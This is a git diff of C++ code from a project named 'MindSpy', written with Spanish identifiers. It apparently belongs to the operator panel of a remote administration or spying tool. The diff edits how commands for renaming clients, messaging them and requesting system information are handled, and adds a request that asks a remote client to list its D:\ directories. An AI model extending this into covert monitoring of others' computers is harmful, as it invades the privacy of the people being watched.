@@ -1,15 +1,15 @@
 #include "CPanel.h"
 
-namespace MindSpy 
+namespace MindSpy
 {
-	int CPanel::TipoComando(const char*c) 
+	int CPanel::TipoComando(const char*c)
 	{
 		// Obtener el comando interno con base en un char*
 		const int CANTIDAD_COMANDOS = 5;
 		char ComandosInternos[CANTIDAD_COMANDOS][16] = { "ALIAS", "ENVIAR", "SYSINFO", "REGINFO", "FILEINFO" };
-		for (int i = 0; i < CANTIDAD_COMANDOS; i++) 
+		for (int i = 0; i < CANTIDAD_COMANDOS; i++)
 		{
-			if (!strcmp(ComandosInternos[i], c)) 
+			if (!strcmp(ComandosInternos[i], c))
 				return i;
 		}
 		return -1;
@@ -53,36 +53,40 @@ namespace MindSpy
 			case INTERNOS_CMDS::REQ_ALIAS:
 				if (c.SetAlias(Op1.c_str(), Op2.c_str()))
 				{
-					cout << "Alias cambiado." << endl;
+					wcout << L"Alias cambiado." << endl;
 				}
 				else
 				{
-					cout << "Alias no cambiado." << endl;
+					wcout << L"Alias no cambiado." << endl;
 				}
 				break;
 
 			case INTERNOS_CMDS::REQ_ENVIAR:
 				if (c.EnviarComando((char*)Op1.c_str(), Op2.length(), CLNT_CMDS::MENSAJE, (BYTE*)Op2.c_str()))
 				{
-					cout << "Mensaje enviado." << endl;
+					wcout << L"Mensaje enviado." << endl;
 				}
 				else
 				{
-					cout << "Mensaje no enviado." << endl;
+					wcout << L"Mensaje no enviado." << endl;
 				}
 				break;
 
 			case INTERNOS_CMDS::REQ_SYSINFO:
 				if (c.EnviarComando((char*)Op1.c_str(), NULL, CLNT_CMDS::SYSINFO, NULL))
-				{
-					cout << "Solicitando información de sistema..." << endl;
-				}
-				else
-				{
-					cout << "Solicitud fallida" << endl;
-				}
+					wcout << L"Solicitando información de sistema..." << endl;
+				break;
 
-
+			case INTERNOS_CMDS::REQ_FILEINFO: {
+				stFileInfoRequest stfir;
+				wcsncpy(stfir.Filtro, L"*.*", 4);
+				wcsncpy(stfir.Path, L"D:\\", 4);
+				stfir.Query = FILEINFO_QUERY::REQ_ONLY_SUBDIR;
+				if (c.EnviarComando((char*)Op1.c_str(), NULL, CLNT_CMDS::FILEINFO, (BYTE*)&stfir))
+					wcout << L"Solicitando información de archivos...";
+				break;
+			}
+											  
 			default:
 				cout << "Comando \"" << Comando << "\" no existente" << endl;
 			}
